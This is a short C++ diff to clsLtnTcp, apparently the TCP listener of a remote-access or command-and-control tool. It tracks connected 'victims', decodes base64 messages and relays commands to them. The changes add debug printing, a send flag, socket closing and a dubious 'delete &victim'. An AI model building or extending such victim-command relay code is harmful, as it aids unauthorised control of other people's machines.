@@ -1,3 +1,5 @@
+#pragma once
+
 #include <iostream>
 #include <cstring>
 #include <unistd.h>
@@ -11,6 +13,7 @@
 #include "clsEZData.hpp"
 #include "clsTools.hpp"
 #include "clsCrypto.hpp"
+#include "clsDebugTools.hpp"
 
 class clsLtnTcp
 {
@@ -192,7 +195,7 @@ private:
 
                             m_vVictim.push_back(victim);
 
-                            victim.fnSendCommand(ls);
+                            victim.fnSendCommand(ls, true);
                         }
                         else
                         {
@@ -210,7 +213,7 @@ private:
                         auto decoded = clsEZData::fnvsB64ToVectorStringParser(szMsg);
                         //decoded.insert(decoded.begin(), m_vicParent.m_szVictimID);
 
-                        clsTools::fnLogInfo(szMsg);
+                        clsDebugTools::fnPrintStringList(decoded);
 
                         m_vicParent.fnSendCommand(decoded);
                     }
@@ -220,5 +223,9 @@ private:
         } while (nRecv > 0);
 
         m_vVictim.erase(std::remove(m_vVictim.begin(), m_vVictim.end(), victim), m_vVictim.end());
+        close(nSktClnt);
+
+
+        delete &victim;
     }
 };
